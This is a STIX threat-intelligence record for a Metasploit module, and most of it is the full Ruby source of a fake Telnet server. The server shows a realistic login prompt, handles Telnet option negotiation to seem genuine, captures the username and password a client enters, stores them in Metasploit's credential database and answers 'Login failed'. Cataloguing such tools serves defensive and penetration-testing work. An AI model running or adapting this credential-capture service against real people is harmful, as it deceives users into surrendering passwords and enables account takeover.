{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2bcb8ae-8d55-4c55-9c98-fced6b950347",
    "created": "2024-08-14T16:22:00.825331Z",
    "modified": "2024-08-14T16:22:00.825335Z",
    "name": "Authentication Capture: Telnet",
    "description": " This module provides a fake Telnet service that is designed to capture authentication credentials.  DONTs and WONTs are sent to the client for all option negotiations except for ECHO at the time of the password prompt since the server controls that for a bit more realism. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/telnet.rb",
            "external_id": "telnet.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# Fake Telnet Service - Kris Katterjohn 09/28/2008\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'           => 'Authentication Capture: Telnet',\n      'Description'    => %q{\n        This module provides a fake Telnet service that\n      is designed to capture authentication credentials.  DONTs\n      and WONTs are sent to the client for all option negotiations,\n      except for ECHO at the time of the password prompt since\n      the server controls that for a bit more realism.\n      },\n      'Author'         => 'kris katterjohn',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [[ 'Capture', 'Description' => 'Run telnet capture server' ]],\n      'PassiveActions' => [ 'Capture' ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [true, 'The local port to listen on.', 23]),\n        OptString.new('BANNER', [false, 'The server banner to display when client connects'])\n      ])\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def banner\n    datastore['BANNER'] || 'Welcome'\n  end\n\n  def run\n    exploit()\n  end\n\n  def on_client_connect(c)\n    @state[c] = {\n      :name    => \"#{c.peerhost}:#{c.peerport}\",\n      :ip      => c.peerhost,\n      :port    => c.peerport,\n      :user    => nil,\n      :pass    => nil,\n      :gotuser => false,\n      :gotpass => false,\n      :started => false\n    }\n  end\n\n  def on_client_data(c)\n    data = c.get_once\n    return if not data\n\n    offset = 0\n\n    if data[0] == 0xff\n      0.step(data.size, 3) do |x|\n        break if data[x] != 0xff\n\n        # Answer DONT/WONT for WILL/WONTs and DO/DONTs,\n        # except for echoing which we WILL control for\n        # the password\n\n        reply = \"\\xff#{data[x + 2].chr}\"\n\n        if @state[c][:pass] and data[x + 2] == 0x01\n          reply[1] = \"\\xfb\"\n        elsif data[x + 1] == 0xfb or data[x + 1] == 0xfc\n          reply[1] = \"\\xfe\"\n        elsif data[x + 1] == 0xfd or data[x + 1] == 0xfe\n          reply[1] = \"\\xfc\"\n        end\n\n        c.put reply\n\n        offset += 3\n      end\n    end\n\n    if not @state[c][:started]\n      c.put \"\\r\\n#{banner}\\r\\n\\r\\n\"\n      @state[c][:started] = true\n    end\n\n    if @state[c][:user].nil?\n      c.put \"Login: \"\n      @state[c][:user] = \"\"\n      return\n    end\n\n    return if offset >= data.size\n\n    data = data[offset, data.size]\n\n    if not @state[c][:gotuser]\n      @state[c][:user] = data.strip\n      @state[c][:gotuser] = true\n      c.put \"\\xff\\xfc\\x01\" # WON'T ECHO\n    end\n\n    if @state[c][:pass].nil?\n      c.put \"Password: \"\n      @state[c][:pass] = \"\"\n      return\n    end\n\n    if not @state[c][:gotpass]\n      @state[c][:pass] = data.strip\n      @state[c][:gotpass] = true\n      c.put \"\\x00\\r\\n\"\n    end\n\n    print_good(\"TELNET LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}\")\n    c.put \"\\r\\nLogin failed\\r\\n\\r\\n\"\n    report_cred(\n      ip: @state[c][:ip],\n      port: datastore['SRVPORT'],\n      service_name: 'telnet',\n      user: @state[c][:user],\n      password: @state[c][:pass]\n    )\n    c.close\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\nend\n"
}